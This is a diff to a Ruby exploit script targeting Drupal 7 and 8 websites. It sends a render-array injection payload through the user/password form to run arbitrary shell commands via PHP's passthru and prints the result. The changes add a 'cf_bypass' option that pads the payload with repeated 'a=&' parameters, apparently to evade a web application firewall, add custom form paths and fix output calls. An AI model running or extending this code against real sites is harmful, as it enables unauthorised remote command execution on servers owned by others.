@@ -73,7 +73,6 @@ rescue Exception => e
 end
 
 
-
 #
 # All target related operations
 #
@@ -86,7 +85,7 @@ class Target
   #   PHP method to use, by default passtrhu
   # @param [String] command
   #   Command to execute
-  def initialize(host, command, php_method = 'passthru', form_path = 0)
+  def initialize(host, command, php_method = 'passthru', form_path, cf_bypass)
     @host       = host
     @php_method = php_method
     @command    = command
@@ -111,28 +110,28 @@ class Target
     return http
   end
 
-  # check a response code,
-  #   if 200, it means the target
+  # check a response code, 
+  #   if 200, it means the target 
   # @param [Net::HTTPRespone] response
   #   the reponse object of request
   # @return [Boolean]
-  #   also, it cheers up if true
+  #   also, it cheers up if true 
   def is_response_200?(response)
     if response.code == "200"
-      success('Target seems to be exploitable! w00hooOO!')
+      puts success('Target seems to be exploitable! w00hooOO!')
       return true
     else
-      failed('Response: ' + response.code)
+      puts error('Response: ' + response.code)
       return false
     end
   end
 
-  # search_in_html
+  # search_in_html 
   #   Parses any given value as an HTML and search in parsed HMLT document
   # @param [String] html
-  #   A string contains html
+  #   A string contains html 
   # @param [String] search_str
-  #   The CSS search string to earch in the html document
+  #   The CSS search string to earch in the html document 
   # @return [Nokogiri::HTML::Document]
   def search_in_html(html, search_str)
     html_doc = Nokogiri::HTML(html)
@@ -142,8 +141,8 @@ class Target
 end
 
 class Drupal8 < Target
-  def initialize(host, command, php_method = 'passthru', form_path = 0)
-    super(host, command, php_method, form_path)
+  def initialize(host, command, php_method = 'passthru', form_path, cf_bypass)
+    super(host, command, php_method, form_path, cf_bypass)
   end
 
   # Not finished yet
@@ -176,8 +175,8 @@ class Drupal8 < Target
 end
 
 class Drupal7 < Target
-  def initialize(host,command,php_method='passthru',form_path=0)
-    super(host, command, php_method, form_path)
+  def initialize(host,command,php_method='passthru',form_path, cf_bypass)
+    super(host, command, php_method, form_path, cf_bypass)
   end
 
   def get_form_build_id(response)
@@ -189,13 +188,22 @@ class Drupal7 < Target
   def exploit
 
     payload = URI.encode("name[#post_render][]=#{@php_method}&name[#markup]=#{@command}&name[#type]=markup")
-    if @form_path == '0'
+
+    if @cf_bypass
+      payload = "a=&"*100 + payload
+    end
+    
+    if @form_path.include? 'user/password'
+      form  = '/user/password/?'
+      form2 = 'file'
+    elsif (@form_path.include? 'q=') && (@form_path.include? 'password') # Hacky as fuck
       form  = '/?q=user/password&'
       form2 = '?q=file'
     else
-      form  = '/user/password/?'
+      form = @form_path
       form2 = 'file'
     end
+
     payload = @uri.path + form + payload
 
     puts info("Requesting: " + @uri.host + payload)
@@ -206,7 +214,7 @@ class Drupal7 < Target
     req.body = 'form_id=user_pass&_triggering_element_name=name'
 
     res1 = @http.request(req)
-    puts info(res.code)
+    puts info(res1.code)
 
     form_build_id = get_form_build_id(res1.body)
 
@@ -226,9 +234,9 @@ class Drupal7 < Target
 
       if res2.body.split('[{"command"')[0] == ""
         if(@command != 'id')
-          failed("Maybe incorrect input command, try simple command as 'id'")
+          puts error("Maybe incorrect input command, try simple command as 'id'")
         end
-          failed("")
+        puts error("")
       end
 
       puts res2.body.split('[{"command"')[0]
@@ -294,7 +302,9 @@ module Options
 
 end
 
+include Utils 
 include Options
+
 options = {}
 option_parser = OptionParser.new
 option_parser.banner = Utils.banner
